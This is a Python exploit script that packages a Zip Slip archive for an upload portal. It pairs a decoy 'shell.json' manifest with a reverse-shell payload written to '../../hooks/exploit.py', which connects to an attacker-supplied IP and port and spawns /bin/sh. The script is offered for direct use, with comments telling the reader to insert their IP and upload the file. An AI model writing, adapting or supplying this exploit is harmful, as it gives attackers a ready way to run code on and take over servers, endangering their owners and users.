import zipfile

# 1. Reverse shell payload (Enter your IP and listener port here)
# This is standard Python reverse shell code that will give you a shell immediately upon server execution.
attacker_ip = "1.1.1.1"  # Put your IP here
attacker_port = 4444          # Put your port here

reverse_shell_code = f"""import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{attacker_ip}",{attacker_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/sh")
"""

# 2. Manifest JSON file (Valid JSON to trick the server)
shell_json_content = """{
    "name": "reverse_shell",
    "assets": []
}"""

# 3. Create zip file and inject Zip Slip (Path Traversal)
with zipfile.ZipFile("exploit.zip", "w") as zf:
    
    # Adding normal shell.json so the upload portal accepts it
    zf.writestr("shell.json", shell_json_content)
    
    # HERE IS THE REAL MAGIC (Zip Slip):
    # Using '../' so that upon zip extraction it escapes the upload folder 
    # and directly saves inside the 'hooks' folder as 'exploit.py'.
    malicious_path = "../../hooks/exploit.py"
    
    zf.writestr(malicious_path, reverse_shell_code)

print("[+] exploit.zip has been successfully created! Now upload it to the portal.")
